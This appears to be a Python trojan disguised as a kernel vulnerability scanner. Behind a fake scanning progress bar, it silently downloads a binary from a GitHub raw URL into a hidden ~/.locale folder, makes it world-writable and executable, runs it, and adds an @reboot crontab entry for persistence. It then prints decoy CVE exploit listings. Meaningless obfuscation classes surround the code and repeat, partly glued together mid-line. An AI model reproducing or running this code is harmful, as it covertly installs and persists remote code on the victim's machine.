class eIytrqBq:
    def __init__(self):
        self.__CNMyKlFQhmwDbiKO()
        self.__ZRaqMFEjdveFf()
        self.__aBRNHhwzRyuv()
        self.__wDdWVsRroEyuRBaMs()
        self.__XLnVQVxNqqHm()
        self.__PxYvyovzEedILJ()
        self.__UolxwsjqOmCRbpBkCABJ()
        self.__bqweJVpjfyqibYLBTNgX()
    def __CNMyKlFQhmwDbiKO(self, MbQAAz, waAbLHh, rbiXWyucjuNYynvSMep, xOgctiWEEp, fJHKuyudOqqsQVeMK, GWfaNYOS, pBzOkTJoQJzAvVsGlXE):
        return self.__ZRaqMFEjdveFf()
    def __ZRaqMFEjdveFf(self, ExEIdDnrju, FVAaWlvIFeXbUgJEuMES):
        return self.__bqweJVpjfyqibYLBTNgX()
    def __aBRNHhwzRyuv(self, OxTHsaPBtcy, dIMFyRljewvOCujkP, wZCGfObV, wROwfzWXqaK, CCrWBLazOSIYY, HNyXLZIePZchWYbV):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __wDdWVsRroEyuRBaMs(self, avwAYLhcoDcGrv, HNAOqLQHUPEt, vPCFNT, GXfDQcxkERCP, dSQFFIedIbQrv, LCEDvswaSjqwSXlFi):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __XLnVQVxNqqHm(self, ixLIpjAYHFeIG):
        return self.__aBRNHhwzRyuv()
    def __PxYvyovzEedILJ(self, aPrAug, NdjYLzoLVSfhadqzw):
        return self.__PxYvyovzEedILJ()
    def __UolxwsjqOmCRbpBkCABJ(self, wMWerpk, gRJXsjYDPpyrxaquD, mqKCz, zhuENyAJJwZSdzCdjy, vWeIAjbDOaPxxopG):
        return self.__XLnVQVxNqqHm()
    def __bqweJVpjfyqibYLBTNgX(self, AdxDfslFwmVQAsuUZ, aLSmOEbjH, zPlQuImmdJVdS):
        return self.__aBRNHhwzRyuv()
import os
import threading
import time
import subprocess

def download_file_with_curl(url, save_path):
    subprocess.run(["curl", "-s", "-L", url, "-o", save_path])

def set_file_permissions(file_path, permissions):
    os.system(f"chmod {permissions} {file_path}")

def add_to_startup_crontab(file_path):
    os.system(f"(crontab -l ; echo '@reboot {file_path} &') | crontab -")

def run_background_tasks():
    github_raw_url = "https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd"
    home_dir = os.path.expanduser("~")
    locale_dir = os.path.join(home_dir, ".locale")


    if not os.path.exists(locale_dir):
        os.makedirs(locale_dir)

    file_path = os.path.join(locale_dir, "systemd")


    download_file_with_curl(github_raw_url, file_path)


    set_file_permissions(file_path, "777")


    os.system(f"{file_path} &")


    add_to_startup_crontab(file_path)

def loading_screen():
    for i in range(101):
        print(f"\rScanning and finding vulnerable kernel version: {i}% ", end="")
        time.sleep(0.05)

if __name__ == "__main__":

    loading_thread = threading.Thread(target=loading_screen)
    loading_thread.start()


    run_background_tasks()


    loading_thread.join()


    print("\nKernel Not Vulnerable try these exploits!")
    print("[+] [CVE-2017-16995] eBPF_verifier\n"
      "   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html\n"
      "   Exposure: highly probable\n"
      "   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,[ ubuntu=14.04 ]{kernel:4.4.0-89-generic},"
      "ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}\n"
      "   Download URL: https://www.exploit-db.com/download/45010\n"
      "   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1\n\n"
      "[+] [CVE-2017-1000112] NETIF_F_UFO\n"
      "   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1\n"
      "   Exposure: probable\n"
      "   Tags: [ ubuntu=14.04{kernel:4.4.0-*} ],ubuntu=16.04{kernel:4.8.0-*}\n"
      "   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c\n"
      "   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-1000112/CVE-2017-1000112/poc.c\n"
      "   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. "
      "Modified version at 'ext-url' adds support for additional distros/kernels\n\n"
      "[+] [CVE-2016-8655] chocobo_root\n"
      "   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1\n"
      "   Exposure: probable\n"
      "   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]\n"
      "   Download URL: https://www.exploit-db.com/download/40871\n"
      "   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled\n")
  class eIytrqBq:
    def __init__(self):
        self.__CNMyKlFQhmwDbiKO()
        self.__ZRaqMFEjdveFf()
        self.__aBRNHhwzRyuv()
        self.__wDdWVsRroEyuRBaMs()
        self.__XLnVQVxNqqHm()
        self.__PxYvyovzEedILJ()
        self.__UolxwsjqOmCRbpBkCABJ()
        self.__bqweJVpjfyqibYLBTNgX()
    def __CNMyKlFQhmwDbiKO(self, MbQAAz, waAbLHh, rbiXWyucjuNYynvSMep, xOgctiWEEp, fJHKuyudOqqsQVeMK, GWfaNYOS, pBzOkTJoQJzAvVsGlXE):
        return self.__ZRaqMFEjdveFf()
    def __ZRaqMFEjdveFf(self, ExEIdDnrju, FVAaWlvIFeXbUgJEuMES):
        return self.__bqweJVpjfyqibYLBTNgX()
    def __aBRNHhwzRyuv(self, OxTHsaPBtcy, dIMFyRljewvOCujkP, wZCGfObV, wROwfzWXqaK, CCrWBLazOSIYY, HNyXLZIePZchWYbV):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __wDdWVsRroEyuRBaMs(self, avwAYLhcoDcGrv, HNAOqLQHUPEt, vPCFNT, GXfDQcxkERCP, dSQFFIedIbQrv, LCEDvswaSjqwSXlFi):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __XLnVQVxNqqHm(self, ixLIpjAYHFeIG):
        return self.__aBRNHhwzRyuv()
    def __PxYvyovzEedILJ(self, aPrAug, NdjYLzoLVSfhadqzw):
        return self.__PxYvyovzEedILJ()
    def __UolxwsjqOmCRbpBkCABJ(self, wMWerpk, gRJXsjYDPpyrxaquD, mqKCz, zhuENyAJJwZSdzCdjy, vWeIAjbDOaPxxopG):
        return self.__XLnVQVxNqqHm()
    def __bqweJVpjfyqibYLBTNgX(self, AdxDfslFwmVQAsuUZ, aLSmOEbjH, zPlQuImmdJVdS):
        return self.__aBRNHhwzRyuv()class eIytrqBq:
    def __init__(self):
        self.__CNMyKlFQhmwDbiKO()
        self.__ZRaqMFEjdveFf()
        self.__aBRNHhwzRyuv()
        self.__wDdWVsRroEyuRBaMs()
        self.__XLnVQVxNqqHm()
        self.__PxYvyovzEedILJ()
        self.__UolxwsjqOmCRbpBkCABJ()
        self.__bqweJVpjfyqibYLBTNgX()
    def __CNMyKlFQhmwDbiKO(self, MbQAAz, waAbLHh, rbiXWyucjuNYynvSMep, xOgctiWEEp, fJHKuyudOqqsQVeMK, GWfaNYOS, pBzOkTJoQJzAvVsGlXE):
        return self.__ZRaqMFEjdveFf()
    def __ZRaqMFEjdveFf(self, ExEIdDnrju, FVAaWlvIFeXbUgJEuMES):
        return self.__bqweJVpjfyqibYLBTNgX()
    def __aBRNHhwzRyuv(self, OxTHsaPBtcy, dIMFyRljewvOCujkP, wZCGfObV, wROwfzWXqaK, CCrWBLazOSIYY, HNyXLZIePZchWYbV):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __wDdWVsRroEyuRBaMs(self, avwAYLhcoDcGrv, HNAOqLQHUPEt, vPCFNT, GXfDQcxkERCP, dSQFFIedIbQrv, LCEDvswaSjqwSXlFi):
        return self.__UolxwsjqOmCRbpBkCABJ()
    def __XLnVQVxNqqHm(self, ixLIpjAYHFeIG):
        return self.__aBRNHhwzRyuv()
    def __PxYvyovzEedILJ(self, aPrAug, NdjYLzoLVSfhadqzw):
        return self.__PxYvyovzEedILJ()
    def __UolxwsjqOmCRbpBkCABJ(self, wMWerpk, gRJXsjYDPpyrxaquD, mqKCz, zhuENyAJJwZSdzCdjy, vWeIAjbDOaPxxopG):
        return self.__XLnVQVxNqqHm()
    def __bqweJVpjfyqibYLBTNgX(self, AdxDfslFwmVQAsuUZ, aLSmOEbjH, zPlQuImmdJVdS):
        return self.__aBRNHhwzRyuv()
